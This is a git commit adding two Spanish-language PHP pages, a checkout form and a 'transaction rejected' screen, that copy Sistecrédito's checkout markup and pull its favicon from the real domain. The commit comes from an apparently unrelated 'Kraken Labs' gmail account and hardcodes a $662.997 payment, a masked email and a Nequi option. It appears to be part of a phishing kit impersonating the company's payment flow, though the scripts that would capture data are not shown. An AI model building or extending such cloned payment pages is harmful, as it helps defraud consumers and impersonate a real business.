06fc7b645fb4d84f71852f038b03ec8ad02942d0
Kraken Labs <krakenanalytics2@gmail.com>
2026-08-13 16:39:26 -0300

    Deploy: paginas checkout + answer-transaction

---
+++ checkout/answer-transaction/index.php
@@ -0,0 +1,30 @@
+<?php
+require_once __DIR__ . '/../../config.php';
+?>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="title" content="Checkout">
+<meta name="description" content="Consulta y paga las cuotas de tus creditos facil, rapido y seguro">
+<title id="pageTitle">Checkout</title>
+<link rel="stylesheet" href="../../assets/css/styles-inline-answer-transaction.css" media="all">
+<link rel="stylesheet" href="../../assets/css/styles-R2RUKIHQ.css" media="all">
+<link rel="stylesheet" href="../../assets/css/styles-components-checkout.css" media="all">
+
+</head>
+<body>
+<div id="ZN_2V8i4bmmYsyGtWl"></div>
+
+    
+    <meta content="width=device-width, initial-scale=1 maximum-scale=1" name="viewport">
+    <title>Checkout</title>
+    
+    <link rel="icon" type="image/x-icon" href="https://checkout.sistecredito.com/favicon.ico">
+    
+  <link rel="stylesheet" href="../../assets/styles-R2RUKIHQ.css" media="all" onload="this.media='all'">
+    <sc-root><router-outlet></router-outlet><sc-root><router-outlet></router-outlet><sc-answer-transaction><sc-answer-transaction-template class="answer-parent"><div class="answer-main"><sc-answer-transaction-header><div class="banner"><sc-pulse-image class="banner__pulse"><div class="pulse-container" style="--pulse-max-size: 90px;"><div class="pulse-container__circle" style="background-color: rgb(255, 240, 240); --circle-min-size: 84px; --circle-max-size: 90px; --circle-scale-ratio: 1.0714285714285714;"></div><div class="pulse-container__inner-circle" style="background-color: rgb(255, 197, 199); --inner-circle-min-size: 50px; --inner-circle-max-size: 74px; --inner-circle-scale-ratio: 1.48; --inner-circle-first-phase-scale: 1.48; --inner-circle-second-phase-scale: 1.8; --inner-circle-min-shrink-scale: 1;"></div><img class="pulse-container__image" src="../../assets/error.png" alt="Transacción rechazada" style="--image-min-size: 44px; --image-max-size: 44px; --image-scale-ratio: 1; --image-first-phase-scale: 1; --image-second-phase-scale: 1; opacity: 1;"></div></sc-pulse-image><div class="banner__title">Transacción rechazada</div></div></sc-answer-transaction-header><sc-payment-detail><div class="payment-detail"><div class="payment-detail__title"> Información de pago </div><div class="payment-detail__detail-information"><div class="sc-col col12 col-md12 col-lg6 cell-information"><div class="text">Valor del pago</div><div class="value">$662.997,00</div></div><div class="sc-col col12 col-md12 col-lg6 cell-information"><div class="text">Medio de pago</div><div class="value">No aplica</div></div><div class="sc-col col12 col-md12 col-lg6 cell-information"><div class="text">Código de seguimiento (CUS)</div><div class="value">0</div></div><div class="sc-col col12 col-md12 col-lg6 cell-information"><div class="text">Descripción del pago</div><div class="value">Pago de Sistecrédito</div></div></div></div></sc-payment-detail></div></sc-answer-transaction-template></sc-answer-transaction></sc-root></sc-root>
+<script src="../../assets/js/app.js" defer></script>
+</body>
+</html>
---
+++ checkout/index.php
@@ -0,0 +1,30 @@
+<?php
+require_once __DIR__ . '/../config.php';
+?>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="title" content="Checkout">
+<meta name="description" content="Consulta y paga las cuotas de tus creditos facil, rapido y seguro">
+<title id="pageTitle">Checkout</title>
+<link rel="stylesheet" href="../assets/css/styles-inline-checkout.css" media="all">
+<link rel="stylesheet" href="../assets/css/styles-R2RUKIHQ.css" media="all">
+<link rel="stylesheet" href="../assets/css/styles-components-checkout.css" media="all">
+
+</head>
+<body>
+<div id="ZN_2V8i4bmmYsyGtWl"></div>
+
+    
+    <meta content="width=device-width, initial-scale=1 maximum-scale=1" name="viewport">
+    <title>Checkout</title>
+    
+    <link rel="icon" type="image/x-icon" href="https://checkout.sistecredito.com/favicon.ico">
+    
+  <link rel="stylesheet" href="../assets/styles-R2RUKIHQ.css" media="all" onload="this.media='all'">
+    <sc-root><router-outlet></router-outlet><sc-root><router-outlet></router-outlet><sc-main><form novalidate="" class="ng-untouched ng-pristine ng-invalid"><sc-modal></sc-modal><sc-payment-detail-template><div class="group"><div class="summary"><sc-summary><div class="summary"><div class="summary__title">Resumen de pago</div><div class="summary__items"><sc-summary-detail><div class="summary-items"><div class="summary-item"><div class="summary-item__title">Green Shoes Fusagasuga</div><div class="summary-item__value"> $662.997 </div></div></div></sc-summary-detail></div><hr><div class="summary__total"><div class="summary__total-title">Total</div><div class="summary__total-value"> $662.997 </div></div></div></sc-summary></div><div class="payment-information"><div class="payment-information__title">Datos personales</div><div></div><div class="payment-information__body"><div class="payment-information__email-display"><span class="email-label">Correo electrónico:</span><span class="email-value">yer****@g***.com</span></div><div class="payment-information__title"> Selecciona un medio de pago </div><sc-payment-methods formcontrolname="paymentMethod" class="ng-untouched ng-pristine ng-invalid"><div class="payments-row"><p class="payment-method-title">Medios de pago</p><div class="payments-row__method sc-col col12 col-sm12 col-md12"><sc-payment-method class="ng-untouched ng-pristine ng-valid"><sc-radio-button name="paymentMethods" class="ng-untouched ng-pristine ng-valid"><div class="radio-item radio-enabled button" tabindex="0"><input type="radio" aria-label="Descripción del radio button" id="radio-button-Nequi" class="ng-untouched ng-pristine ng-valid"><label aria-hidden="true" for="radio-button-Nequi"><div class="payment-elements"><img scimageerror="" loading="lazy" src="../assets/7.webp" alt="Nequi_icon" style="width: 32px;"><div>Nequi</div></div></label></div></sc-radio-button></sc-payment-method></div></div></sc-payment-methods></div></div><sc-button class="pay-button"><button class="button button--block button--primary button--lg" disabled="" id="payBtn"><span class="button__text">Pagar</span></button></sc-button></div></div></sc-main></sc-root></sc-root>
+<script src="../assets/js/app.js" defer></script>
+</body>
+</html>
